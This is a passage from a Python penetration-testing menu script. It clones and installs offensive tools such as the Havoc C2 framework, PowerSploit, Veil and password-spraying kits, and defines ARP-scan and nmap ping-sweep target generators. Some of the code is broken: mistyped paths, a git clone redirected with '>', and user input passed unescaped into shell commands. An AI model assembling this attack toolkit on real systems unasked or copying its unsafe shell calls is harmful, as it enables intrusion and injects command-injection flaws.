            os.system('git clone https://github.com/dafthack/DomainPasswordSpray /opt/DomainPasswordSpray')
            print()

        if os.path.exists('/opt/Egress-Assess/.git') and os.path.exists('/opt/Egress-Assess-venv'):
            print(f"{BLUE}[*]Updating Egress-Assess...{NC}")
            os.system('cd /opt/Egress-Assess/ ; git pull')
            print()
        else:
            print(f"{YELLOW}[*]Installing Egress-Assess.{NC}")
            os.system('git clone https://github.com/ChrisTruncer/Egress-Assess /opt/Egress-Assess')
            print(f"{YELLOW}[*]Setting up Egress-Assess virtualenv...{NC}")
            os.system('virtualenv -p /usr/bin/python3 /opt/Egress-Assess-venv')
            os.system('source /opt/Egress-Assess-venv/bin/activate')
            os.chdir('/opt/Egress-Assess')
            os.system('pip3 install -r requirements.txt')
            os.system('deactivate')
            print()

        if os.path.exists('/opt/egressbuster/.git'):
            print(f"{BLUE}[*]Updating egressbuster...{NC}")
            os.system('cd /opt/egressbuster/ ; git pull')
            print()
        else:
            print(f"{YELLOW}[*]Installing egressbuster.{NC}")
            os.system('git clone https://github.com/trustedsec/egressbuster /opt/egressbuster')
            print()

        if not os.path.exists('/usr/bin/feroxbuster'):
            print(f"{YELLOW}[*]Installing feroxbuster...{NC}")
            os.system('apt install -y feroxbuster')
            print()

        if os.path.exists('/opt/Freeze/.git'):
            print(f"{BLUE}[*]Updating Freeze.{NC}")
            os.system('cd /opt/Freeze/ ; git pull')
            print()
        else:
            print(f"{YELLOW}[*]Installing Freeze...{NC}")
            os.system('git clone https://github.com/optiv/Freeze /opt/Freeze')
            print()

        if not os.path.isfile('/usr/bin/gobuster'):
            print(f"{BLUE}[*]Installing gobuster...{NC}")
            os.system("apt install -y gobuster")
            print()

        if os.path.isdir('/opt/Havoc/.git'):
            print(f"{BLUE}[*]Updating Havoc...{NC}")
            os.chdir('/opt/Havoc/')
            os.system('git pull')
            print()
        else:
            print(f"{YELLOW}[*]Installing Havoc...{NC}")
            os.system('git clone https://github.com/HavocFramework/Havoc /opt/Havoc')
            os.system('apt install -y git build-essential apt-utils cmake libfontconfig1 libglu1-mesa-dev libgtest-dev libspdlog-dev libboost-all-dev libncurses5-dev libgdbm-dev libssl-dev libreadline-dev libffi-dev libsqlite3-dev libbz2-dev mesa-common-dev qtbase5-dev qtchooser qt5-qmake qtbase5-dev-tools libqt5websockets5 libqt5websockets5-dev qtdeclarative5-dev golang-go qtbase5-dev libqt5websockets5-dev libspdlog-dev python3-dev libboost-all-dev mingw-w64 nasm')
            print()

        if os.path.isdir('/opt/krbrelayx/.git'):
            print(f"{BLUE}[*]Updating krbrelayx...{NC}")
            os.chdir('/opt/krbrelayx/')
            os.system('git pull')
            print()
        else:
            print(f"{YELLOW}[*]Installing krbrelayx...{NC}")
            os.system('git clone https://github.com/dirkjanm/krbrelayx /opt/krbrelayx')
            print()

        if not os.path.isfile('/usr/bin/nishang'):
            print(f"{YELLOW}[*]Installing nishang...{NC}")
            os.system("apt install -y nishang")
            print()

        print(f"{BLUE}[*]Updating Nmap scripts...{NC}")
        os.system("nmap --script-updatedb | egrep -v '(Starting|seconds)' | sed 's/NSE: //'")
        print()

        if os.path.isdir('/opt/PEASS-ng/.git'):
            print(f"{BLUE}[*]Updating PEASS-ng...{NC}")
            os.chdir('/opt/PEASS-ng/')
            os.system('git pull')
            print()
        else:
            print(f"{YELLOW}[*]Installing PEASS-ng...{NC}")
            os.system('git clone https://github.com/carlospolop/PEASS-ng /opt/PEASS-ng')
            print()

        if os.path.isdir('/opt/PowerSharpPack/.git'):
            print(f"{BLUE}[*]Updating PowerSharpPack...{NC}")
            os.chdir('/opt/PowerSharpPack/')
            os.system('git pull')
            print()
        else:
            print(f"{YELLOW}[*]Installing PowerSharpPack...{NC}")
            os.system('git clone https://github.com/S3cur3Th1sSh1t/PowerSharpPack /opt/PowerSharpPack')
            print()

        if os.path.isdir('/opt/PowerSploit/.git'):
            print(f"{BLUE}[*]Updating PowerSploit...{NC}")
            os.chdir('/opt/PowerSploit/')
            os.system('git pull')
            print()
        else:
            print(f"{YELLOW}[*]Installing PowerSploit...{NC}")
            os.system('git clone https://github.com/0xe7/PowerSploit /opt/PowerSploit')
            print()
            
        if os.path.isdir('/opt/PowerUpSQL/.git'):
            print(f"{BLUE}[*]Updating PowerUpSQL...{NC}")
            os.chdir('/opt/PowerUpSQL/')
            os.system('git pull')
            print()
        else:
            print(f"{YELLOW}[*]Installing PowerUpSQL...{NC}")
            os.system('git clone https://github.com/NetSPI/PowerUpSQL /opt/PowerUpSQL')
            print()
        if os.path.isdir('/opt/PrivescCheck/.git'):
            print(f'{BLUE}[*]Updating PrivescCheck...{NC}')
            os.chdir('/opt/PrivescCheck/')
            os.system('git pull')
            print()
        else:
            print(f'{YELLOW}[*]Installing PrivescCheck.\033[0m')
            os.system('git clone https://github.com/itm4n/PrivescCheck /opt/PrivescCheck')
            print()

        if not os.path.isfile('/usr/share/wordlists/rockyou.txt'):
            print(f'{BLUE}[*]Expanding Rockyou list...{NC}')
            os.system('zcat /usr/share/wordlists/rockyou.txt.gz > /usr/share/wordlists/rockyou.txt')
            os.system('rm /usr/share/wordlists/rockyou.txt.gz')
            print()
        
        if not os.path.isdir('usr/bin/rustc'):
            print(f"{BLUE}[*]Installing Rust...{NC}")
            os.system('apt install -y rustc')
            print()
        
        if not os.path.isdir('usr/share/seclists'):
            print(f"{BLUE}[*]Installing SecLists...{NC}")
            print()
        
        if os.path.isdir('/opt/ShaepCollection/.git'):
            print(f"{BLUE}[*]Updating SharpCollection...{NC}")
            os.chdir('/opt/SharpCollection')
            os.system('git pull')
            print()
        else:
            print(f"{YELLOW}[*]Installing SharpCollection...{NC}")
            os.system('git clone https://github.com/Flangvik/SharpCollection > /opt/SharpCollection')
            print()
            
        if os.path.isdir('/opt/spoofcheck/.git') and os.path.isdir ('/opt/spoofcheck-venv' ):
            print(f'{BLUE}[*]Updating spoofcheck...{NC}')
            os.chdir('/opt/spoofcheck/')
            os.system('git pull')
            os.system('source /opt/spoofcheck-venv/bin/activate')
            os.system('pip3 install -r requirements.txt --upgrade')
            os.system('deactivate')
            print()
        else:
            print(f'{YELLOW}[*]Installing spoofcheck...{NC}')
            os.system('git clone https://github.com/BishopFox/spoofcheck /opt/spoofcheck')
            print(f'{YELLOW}[*]Setting up spoofcheck virtualenv...{NC}')
            os.system('virtualenv -p /usr/bin/python3 /opt/spoofcheck-venv')
            os.system('source /opt/spoofcheck-venv/bin/activate')
            os.chdir('/opt/spoofcheck/')
            os.system('pip3 install -r requirements.txt')
            os.system('deactivate')
            print()
            
        if os.path.isdir('/opt/subfinder/.git'):
            print(f'{BLUE}[*]Updating subfinder...{NC}')
            os.chdir('/opt/subfinder/')
            subprocess.call(['git', 'pull'])
            print()
        else:
            print(f'{YELLOW}[*]Installing subfinder...{NC}')
            os.system('git clone https://github.com/projectdiscovery/subfinder /opt/subfinder')
            os.chdir('/opt/subfinder/v2/cmd/subfinder')
            os.system('go build')
            print()

        if os.path.isdir('/opt/theHarvester/.git') and os.path.isdir('/opt/theHarvester-venv'):
            print(f'{BLUE}[*]Updating theHarvester...{NC}')
            os.chdir('/opt/theHarvester/')
            subprocess.call(['git', 'pull'])
            subprocess.call(['source', '/opt/theHarvester-venv/bin/activate'])
            subprocess.call(['/opt/theHarvester-venv/bin/pip3', 'install', '-r', 'requirements.txt', '--upgrade'])
            subprocess.call(['deactivate'])
            print()
        else:
            print(f'{YELLOW}[*]Installing theHarvester...{NC}')
            os.system('git clone https://github.com/laramies/theHarvester /opt/theHarvester')
            print()
            print(f'{YELLOW}[*]Setting up theHarvester virtualenv...{NC}')
            os.system('virtualenv -p /usr/bin/python3 /opt/theHarvester-venv')
            subprocess.call(['source', '/opt/theHarvester-venv/bin/activate'])
            os.chdir('/opt/theHarvester/')
            subprocess.call(['/opt/theHarvester-venv/bin/pip3', 'install', '-r', 'requirements.txt'])
            subprocess.call(['deactivate'])
            print()

        if not os.path.isfile('/usr/bin/veil'):
            print(f'{YELLOW}[*]Installing Veil...{NC}')
            os.system('apt install -y veil')
            print()

        if os.path.isdir('/opt/Windows-Exploit-Suggester-NG/.git'):
            print(f'{BLUE}[*]Updating Windows Exploit Suggester NG...{NC}')
            os.chdir('/opt/Windows-Exploit-Suggester-NG/')
            subprocess.call(['git', 'pull'])
            print()
        else:
            print(f'{YELLOW}[*]Installing Windows Exploit Suggester NG...{NC}')
            os.system('git clone https://github.com/bitsadmin/wesng /opt/Windows-Exploit-Suggester-NG')
            print()

        if not os.path.isfile('/usr/bin/xlsx2csv'):
            print(f'{YELLOW}[*]Installing xlsx2csv...{NC}')
            os.system('apt-get install -y xlsx2csv')
            print()

        if not os.path.isfile('/usr/bin/xml_grep'):
            print(f'{YELLOW}[*]Installing xml_grep...{NC}')
            os.system('apt-get install -y xml-twig-tools')
            print()

        if not os.path.isfile('/usr/bin/xspy'):
            print(f'{YELLOW}[*]Installing xspy...{NC}')
            os.system('apt install -y xspy')
            print()

        if not os.path.isfile('/opt/xwatchwin/xwatchwin'):
            print(f'{YELLOW}[*]Installing xwatchwin...{NC}')
            os.system('apt install -y imagemagick libxext-dev xutils-dev')
            os.system('wget http://www.ibiblio.org/pub/X11/contrib/utilities/xwatchwin.tar.gz')
            os.system('tar zxvf xwatchwin.tar.gz')
            os.system('rm xwatchwin.tar')
            
        print(f'{RED}[*]UPDATING LOCAL DATABASE...{NC}')
        os.system('updatedb')
        print(f"Time Taken: {time.time() - start_time:.2f} seconds")
        exit()
                    
def generate_targets():
        print("""    
                  
                                           (
                .            )        )
                         (  (|              .
                     )   )\/ ( ( (
             *  (   ((  /     ))\))  (  )    )
           (     \   )\(          |  ))( )  (|
           >)     ))/   |          )/  \((  ) \
           (     (      .        -.     V )/   )(    (
            \   /     .   \            .       \))   ))
              )(      (  | |   )            .    (  /
             )(    ,'))     \ /          \( `.    )
             (\>  ,'/__      ))            __`.  /
            ( \   | /  ___   ( \/     ___   \ | ( (
             \.)  |/  /   \__      __/   \   \|  ))
            .  \. |>  \      | __ |      /   <|  /
                 )/    \____/ :..: \____/     \ <
          )   \ (|__  .      / ;: \          __| )  (
         ((    )\)  ~--_     --  --      _--~    /  ))
          \    (    |  ||               ||  |   (  /
                \.  |  ||_             _||  |  /
                  > :  |  ~V+-I_I_I-+V~  |  : (.
                 (  \:  T\   _     _   /T  : ./
                  \  :    T^T T-+-T T^T    ;<
                   \..`_       -+-       _'  )
         )            . `--=.._____..=--'. ./         (
        ((     ) (          )             (     ) (   )>
         > \/^/) )) (   ( /(.      ))     ))._/(__))./ (_.
        (  _../ ( \))    )   \ (  / \.  ./ ||  ..__:|  _. \
        |  \__.  ) |   (/  /: :)) |   \/   |(  <.._  )|  ) )
       ))  _./   |  )  ))  __  <  | :(     :))   .//( :  : |
       (: <     ):  --:   ^  \  )(   )\/:   /   /_/ ) :._) :
        \..)   (_..  ..  :    :  : .(   \..:..    ./__.  ./
                   ^    ^      \^ ^           ^\/^     ^
  
                  
                  """)
        print()
        def f_arpscan():
            print()
            interface = input("Interface to scan: ")

            # Check for no answer
            if not interface:
                f_error()

            os.system(f"arp-scan -l -I {interface} | egrep -v '(arp-scan|DUP:|Interface|packets)' > tmp")
            os.system("sed '/^$/d' tmp | sort -k3 > $home/data/arp-scan.txt")
            os.system("awk '{print $1}' tmp | $sip | sed '/^$/d' > /opt/XYZ/generate_targets/targets-arp-scan.txt")
            os.system("rm tmp")

            print()
            print()
            print("***Scan complete.***")
            print()
            print()
            print(f"The new report is located at {YELLOW}$home/data/targets-arp-scan.txt{NC}\n")
            print()
            print()
            exit()

        def f_pingsweep():
            print()
            print(f"{BLUE}Type of input:{NC}")
            print()
            print("1.  List containing IPs, ranges, and/or CIDRs.")
            print("2.  Manual")
            print()
            choice = input("Choice: ")

            if choice == "1":
                f_location()

                os.system(f"nmap -sn -PS -PE --stats-every 10s -iL {location} > tmp")

            elif choice == "2":
                manual = input("Enter a CIDR or range: ")

                # Check for no answer
                if not manual:
                    f_error()

                os.system(f"nmap -sn -PS -PE --stats-every 10s {manual} > tmp")

            else:
                f_error()

            os.system("grep -oE '\b([0-9]{1,3}\.){3}[0-9]{1,3}\b' tmp > /opt/XYZ/generate_targets/targets-pingsweep.txt")
            os.system("rm tmp")

            print()
            print()
            print("***Scan complete.***")
            print()
            print()
            print(f"The new report is located at {YELLOW} /opt/XYZ/generate_targets/targets-pingsweep.txt{NC}\n")
            print()
            print()
            exit()

        def f_location():
            global location
            location = input("Enter the path of the file: ")

            # Check for no answer
            if not location:
                f_error()

        def f_error():
            print()
            print(f"{YELLOW}INVALID CHOICE. PLEASE TRY AGAIN.{NC}")
            time.sleep(2)
            os.system('clear')
            generate_targets()

        def generate_targets():
            if not os.path.exists("/opt/XYZ/"):
                os.chdir("/opt")
                os.system("mkdir XYZ")
                os.chdir("/opt/XYZ")
                os.system("mkdir generate_targets")
                os.chdir("/opt/XYZ/generate_targets")
                start_time = time.time()

            print(f'{BLUE} TARGET GENERATOR: {NC}')       
            os.system('clear')     
            print(f"{BLUE}SCANNING{NC}")
            print()
            print(f"Time Taken: {time.time() - start_time:.2f} seconds")
                            
def f_runlocally():
    pass

def f_banner():
    pass

def f_error():
    pass
    
def main():
    while True:
        menu()
        choice = input("Enter your choice: ")

        if choice == '1':
            passive_recon()
            
        elif choice == '2':
            active_recon()
            
        elif choice == '3':
            person()
            
        elif choice == '4':
            metasploit()
        
        elif choice == "5":
            dos()
            
        elif choice == "6":
            full_update() 
            print(f"{RED} UPDATED...{NC}")
            
        elif choice == "7":
            generate_targets()
        
        elif choice == '8':
            print(f"{GREEN}Exiting...{NC}")
            break  # exit the while loop
        
        else:
            print(f"{RED}Invalid choice!{NC}")
            break
    
main()